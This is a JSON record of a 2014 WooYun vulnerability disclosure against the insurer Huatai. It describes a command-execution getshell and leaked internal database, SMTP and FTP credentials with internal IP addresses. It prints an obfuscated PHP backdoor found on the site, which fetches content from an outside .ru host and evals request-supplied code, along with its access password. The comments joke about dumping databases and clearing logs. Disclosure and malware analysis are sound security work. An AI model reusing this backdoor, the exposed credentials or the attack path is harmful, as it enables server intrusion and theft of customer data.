{"id": 650, "wybug_id": "wooyun-2014-074622", "wybug_title": "华泰保险多处漏洞可控制服务器及漫游内网", "wybug_corp": "华泰保险www.ehuatai.com", "wybug_author": "Anonymous", "wybug_date": "2014-09-01 14:16", "wybug_open_date": "2014-10-16 14:20", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向公众公开  简要描述：  详细说明：  首先是一处openssl219.141.242.48\n\nhttp://shop.ehuatai.com/pages/member/loginQueryPlicy.action //命令执行导致getshell\n\n找了下配置文件datasource.driverClassName=oracle.jdbc.OracleDriverdatasource.url=jdbc\\:oracle\\:thin\\:@(DESCRIPTION\\=(ADDRESS_LIST\\=(ADDRESS\\=(PROTOCOL \\= TCP)(HOST \\= 10.2.19.19)(PORT \\= 1521)))(CONNECT_DATA\\=(SERVER \\= DEDICATED)(SERVICE_NAME \\= htrac)))datasource.username=htgxwxdatasource.password=phtgxwnd\n\n\n\nsmtpmail.smtp.host=10.2.19.198mail.smtp.port=25mail.smtp.auth=falsemail.from.username=adminmail.from.password=adminmail.smtp.from=admin@ehuatai.com某ftpftp.id=10.4.32.113ftp.port=21ftp.name=uploadftp.password=uploadftp.directory =/http://club.ehuatai.com/club.ehuatai.com.zip //源码备份下载\n\n //通过D盾查杀工具判断出/templates/cl_club_i/theme-inc.php是后门\n<?php error_reporting(0);$host=base64_decode('aHR0cDovL21veWFvYnV2a2EucnUvaW5jL2dldC5waHA=');$ident=base64_decode('dFM2UjNFc0Zo');if(preg_match(base64_decode('Lyh5YW5kZXh8Z29vZ2xlKS9p'),$_SERVER[base64_decode('SFRUUF9VU0VSX0FHRU5U')])){$id=urlencode(base64_decode('aHR0cDovLw==').$_SERVER[base64_decode('U0VSVkVSX05BTUU=')].$_SERVER[base64_decode('UkVRVUVTVF9VUkk=')]);$bot=urlencode($_SERVER[base64_decode('SFRUUF9VU0VSX0FHRU5U')]);$url=$host.base64_decode('P2lkPQ==').$id.base64_decode('JmNoYXJzZXQ9dSZib3Q9').$bot;if(ini_get(base64_decode('YWxsb3dfdXJsX2ZvcGVu'))==1){echo file_get_contents($url);}elseif(function_exists(base64_decode('Y3VybF9pbml0'))){$ch=curl_init($url);curl_setopt($ch,CURLOPT_HEADER,FALSE);curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);$result=curl_exec($ch);curl_close($ch);echo $result;}}$url=$host.base64_decode('P2NvZGU9Y29kZSZib3Q9').$bot;if(ini_get(base64_decode('YWxsb3dfdXJsX2ZvcGVu'))==1){echo file_get_contents($url);}elseif(function_exists(base64_decode('Y3VybF9pbml0'))){$ch=curl_init($url);curl_setopt($ch,CURLOPT_HEADER,FALSE);curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);$result=curl_exec($ch);curl_close($ch);echo $result;}if($_REQUEST[base64_decode('Yw==')]==$ident)eval(stripslashes($_REQUEST[base64_decode('Y29kZQ==')]));?>\n解密php文件得出<?php aval(stropslashes($_REQUEST['code']));\n\n/templates/cl_club_i/theme-inc.php?c=tS6R3EsFh  一句话密码code\n\n<T>MYSQL</T><H>10.2.19.167</H><U>eht_dbuser</U><P>123</P><L>utf8</L>\n\n   漏洞证明：  见详细说明   修复方案：  你们懂 --    版权声明：转载请注明来源 Anonymous@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-09-06 09:04 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-01 18:16 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  感觉跟我的会大部分重复    \n     2014-09-01 20:21 |    \t\tAnonymous \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:30        | 园长是大傻逼)\t\t \n  @蓝冰 内网漫游-     \n     2014-09-01 20:22 |    \t\tAnonymous \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:30        | 园长是大傻逼)\t\t \n  @蓝冰 你脱裤的日志我已经帮你清空了    \n     2014-09-01 20:23 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  @Anonymous 哦哦 嗯 我没漫游 网速太tm卡了    \n     2014-09-01 20:24 |    \t\t蓝冰 \t\t\t( 核心白帽子 |\t\t\t        Rank:627 漏洞数:50        | -.-)\t\t \n  @Anonymous  大牛 别这样 我啥时候脱裤了 冤枉啊    \n     2014-10-08 17:27 |    \t\tonlycjeg \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:5        | 我就看看,我不说话.)\t\t \n  下载备份代码，然后webshell查杀，，想法挺好啊。    \n     2014-10-16 22:11 |    \t\t第四维度 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:34        | 谦谦君子，温润如玉)\t\t \n  @Anonymous strust的那个上传文件是传在系统目录下的，用web怎么访问啊？    \n     2014-10-18 10:35 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  @第四维度 同问 @Anonymous    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}